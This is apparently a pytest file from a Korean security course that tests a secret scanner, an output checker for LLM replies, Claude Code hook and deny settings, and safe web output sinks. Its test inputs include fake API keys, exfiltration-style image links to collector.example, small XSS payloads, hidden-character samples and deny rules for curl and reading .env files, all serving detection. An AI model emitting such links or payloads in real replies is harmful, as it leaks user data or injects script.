"""11장: 비밀 탐지, 출력 검사, 훅, 설정, 웹 출력 지점의 테스트.

실제 서비스의 키 형식은 파일에 그대로 적지 않고 실행 중에 이어 붙여 만든다(이 파일을 GitHub에 올려도
푸시 보호와 비밀 스캔에 걸리지 않게 하려는 것이다). 만든 값은 모두 가짜이다.
"""

import base64
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
TOOLS = ROOT / "security" / "tools"
sys.path.insert(0, str(TOOLS))
sys.path.insert(0, str(ROOT / "security" / "lab"))
import check_output  # noqa: E402
import scan_secrets  # noqa: E402
import try_hook  # noqa: E402
from secret_patterns import find_secrets  # noqa: E402

FAKE = {
    "anthropic_api_key": "sk-" + "ant-" + "api03-" + "Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4z" * 2,
    "github_token": "gh" + "p_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
    "aws_access_key_id": "AK" + "IA" + "Z3QX7MPL2WTRB9KD",
    "lab_key": "LABKEY-" + "5f0c" * 8,
}


def kinds(text):
    return {kind for _, kind, _ in find_secrets(text)}


@pytest.mark.parametrize("kind,value", FAKE.items())
def test_patterns_find_each_kind(kind, value):
    assert kind in kinds(f"config = '{value}'\n")


def test_patterns_ignore_placeholders_and_allow_mark():
    assert not find_secrets("ANTHROPIC_API_KEY=\nLLM_MODEL=claude-haiku-5-5\n")
    assert not find_secrets("API_KEY=your-api-key-goes-here-xxxx\n")
    assert not find_secrets(f"sample = '{FAKE['lab_key']}'  # secret-scan: allow\n")


def test_generic_assignment_needs_high_entropy():
    assert "generic_assignment" in kinds("SERVICE_" + "TOKEN=" + "q8Zr2LwX9vNc4TbE7yKu\n")
    assert not find_secrets("PASSWORD=aaaaaaaaaaaaaaaaaaaa\n")


@pytest.fixture
def repo(tmp_path):
    def git(*args):
        subprocess.run(["git", "-C", str(tmp_path), *args], check=True, capture_output=True)
    git("init", "-q")
    git("config", "user.email", "lab@example.invalid")
    git("config", "user.name", "lab")
    (tmp_path / ".gitignore").write_text(".env\nsecrets/\n", encoding="utf-8")
    (tmp_path / "app.py").write_text("print('hello')\n", encoding="utf-8")
    git("add", ".")
    git("commit", "-qm", "first")
    return tmp_path, git


def test_scan_reports_committable_and_ignored_separately(repo, capsys):
    root, _ = repo
    (root / ".env").write_text(f"ANTHROPIC_API_KEY={FAKE['anthropic_api_key']}\n", encoding="utf-8")
    assert scan_secrets.main(["--root", str(root)]) == 0  # .env는 무시되므로 커밋될 수 있는 곳은 깨끗하다
    assert scan_secrets.main(["--root", str(root), "--include-ignored"]) == 0
    out = capsys.readouterr().out
    assert "무시됨(커밋되지 않음)  .env:1  anthropic_api_key" in out
    assert FAKE["anthropic_api_key"] not in out  # 출력에서 값은 가린다

    (root / "api_config.py").write_text(f"KEY = '{FAKE['lab_key']}'\n", encoding="utf-8")
    assert scan_secrets.main(["--root", str(root)]) == 1
    assert "발견  api_config.py:1  lab_key" in capsys.readouterr().out


def test_scan_history_finds_removed_secret(repo, capsys):
    root, git = repo
    (root / "settings.py").write_text(f"TOKEN = '{FAKE['github_token']}'\n", encoding="utf-8")
    git("add", "settings.py")
    git("commit", "-qm", "add token by mistake")
    (root / "settings.py").write_text("TOKEN = None\n", encoding="utf-8")
    git("commit", "-qam", "remove token")
    assert scan_secrets.main(["--root", str(root)]) == 0  # 지금 파일에는 없다
    assert scan_secrets.main(["--root", str(root), "--history"]) == 1  # 기록에는 남아 있다
    assert "settings.py  github_token" in capsys.readouterr().out


def test_allowlist_suppresses_listed_path_and_kind(repo):
    root, _ = repo
    (root / "fixtures").mkdir()
    (root / "fixtures" / "fake.py").write_text(f"K = '{FAKE['lab_key']}'\n", encoding="utf-8")
    assert scan_secrets.main(["--root", str(root)]) == 1
    (root / "security").mkdir()
    allow = root / "security" / "allowlist.txt"
    allow.write_text("# 테스트용 가짜 값\nfixtures/*.py:github_token\n", encoding="utf-8")
    assert scan_secrets.main(["--root", str(root)]) == 1  # 종류가 다르면 예외가 아니다
    allow.write_text("# 테스트용 가짜 값\nfixtures/*.py:lab_key\n", encoding="utf-8")
    assert scan_secrets.main(["--root", str(root)]) == 0


def test_ci_entry_script_runs():
    """13장의 CI는 security/scan_secrets.py를 부른다. 같은 검사가 같은 종료 코드로 돈다."""
    result = subprocess.run([sys.executable, str(ROOT / "security" / "scan_secrets.py"), "--root", str(ROOT)],
                            capture_output=True, text=True, encoding="utf-8")
    assert "검사한 파일:" in result.stdout
    assert result.returncode in (0, 1)


def test_repository_has_no_committable_secret():
    """이 저장소에서 커밋될 수 있는 파일에 비밀이 없다(13장의 CI에서도 이 테스트가 돈다)."""
    if not (ROOT / ".git").exists() or shutil.which("git") is None:
        pytest.skip("git 저장소가 아니다")
    assert scan_secrets.main(["--root", str(ROOT)]) == 0


def problem_kinds(text):
    return {kind for kind, _, _ in check_output.check(text)}


def test_output_check_finds_each_problem():
    assert problem_kinds(f"값: {FAKE['lab_key']}") == {"secret"}
    assert problem_kinds("![상태](https://collector.example/p.png?d=abc)") == {"exfil_link"}
    assert problem_kinds("[자세히](https://collector.example/c?d=abc)") == {"exfil_link"}
    assert problem_kinds("<img src=x onerror=\"alert(1)\">") == {"active_html"}
    assert problem_kinds("<script>alert(1)</script>") == {"active_html"}
    assert problem_kinds("마감일​을 확인한다") == {"invisible"}
    assert problem_kinds("요약 \U000e0041\U000e0042") == {"invisible"}


def test_output_check_passes_normal_reply():
    reply = ("요약: 공고 상세 화면의 마감일이 하루 늦게 보인다\n"
             "- 관련 파일: web/js/job.js\n"
             "참고: [훅 문서](https://code.claude.com/docs/en/hooks)\n")
    assert check_output.check(reply) == []


def test_output_check_misses_encoded_secret():
    """한계: 모양으로 찾는 검사는 인코딩한 비밀을 놓친다. 그래서 출력 검사 하나에 기대지 않는다."""
    encoded = base64.b64encode(FAKE["lab_key"].encode()).decode()
    assert check_output.check(f"확인 값: {encoded}") == []


def test_redact_removes_secret_and_invisible():
    text = f"키 {FAKE['lab_key']} 끝​"
    cleaned = check_output.redact(text)
    assert FAKE["lab_key"] not in cleaned and "​" not in cleaned and "[가림]" in cleaned


def test_hook_samples_behave_as_named():
    hook = ROOT / ".claude" / "hooks" / "block_secrets.py"
    if not hook.exists():
        pytest.fail("대책 파일이 없다: .claude/hooks/block_secrets.py (강의안 11절)")
    assert try_hook.main(["--root", str(ROOT)]) == 0


def test_settings_have_security_rules_and_hook():
    path = ROOT / ".claude" / "settings.json"
    settings = json.loads(path.read_text(encoding="utf-8"))
    deny = settings.get("permissions", {}).get("deny", [])
    for rule in ["Read(./.env)", "Read(./secrets/**)", "Edit(./secrets/**)", "Bash(curl *)", "WebFetch"]:
        assert rule in deny, f"deny에 {rule}이 없다"
    hooks = [h for group in settings.get("hooks", {}).get("PreToolUse", []) for h in group.get("hooks", [])]
    commands = [h.get("command", "") for h in hooks]
    assert any("block_secrets" in c for c in commands), "PreToolUse에 비밀 정보 보호 훅(block_secrets)이 없다"
    for h in hooks:
        if "block_secrets" in h.get("command", ""):
            # 훅이 시작하지 못하거나 시간을 넘기면 기본으로는 호출이 진행된다. 보안 훅은 그때도 막는다
            assert h.get("onFailure") == "block", "비밀 정보 보호 훅에 \"onFailure\": \"block\"이 없다"
    matchers = [group.get("matcher", "") for group in settings.get("hooks", {}).get("PreToolUse", [])
                if any("block_secrets" in h.get("command", "") for h in group.get("hooks", []))]
    # Windows의 PowerShell 도구는 Bash 매처에 걸리지 않는다(셸 명령을 보는 훅은 Bash|PowerShell로 맞춘다)
    assert any({"Bash", "PowerShell"} <= set(m.split("|")) for m in matchers), "셸 명령 매처에 Bash와 PowerShell이 함께 없다"
    for name in ("block_secrets.sh", "block_secrets.py"):
        if any(name in c for c in commands):
            # 등록한 파일이 없으면 훅이 실행되지 못하고, 실행되지 못한 훅은 호출을 막지 않는다
            assert (ROOT / ".claude" / "hooks" / name).exists(), f"등록한 훅 파일이 없다: .claude/hooks/{name}"


def test_triage_agent_has_no_write_shell_or_network_tool():
    path = ROOT / ".claude" / "agents" / "issue-triage.md"
    if not path.exists():
        pytest.fail("대책 파일이 없다: .claude/agents/issue-triage.md (강의안 11절)")
    text = path.read_text(encoding="utf-8")
    tools_line = re.search(r"^tools:\s*(.+)$", text, re.M)
    assert tools_line, "tools를 적지 않으면 모든 도구를 물려받는다"
    tools = {t.strip() for t in tools_line.group(1).split(",")}
    assert not tools & {"Write", "Edit", "Bash", "WebFetch", "NotebookEdit"}


def test_web_uses_text_sinks_only():
    """웹은 서버와 LLM이 준 글을 textContent로만 넣는다(부적절한 출력 처리 대책: 2025년판 LLM05, 2026년판 LLM10)."""
    risky = re.compile(r"\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write\s*\(")
    for js in sorted((ROOT / "web" / "js").glob("*.js")):
        for lineno, line in enumerate(js.read_text(encoding="utf-8").splitlines(), start=1):
            assert not risky.search(line), f"{js.name}:{lineno}: HTML로 해석되는 출력 지점"
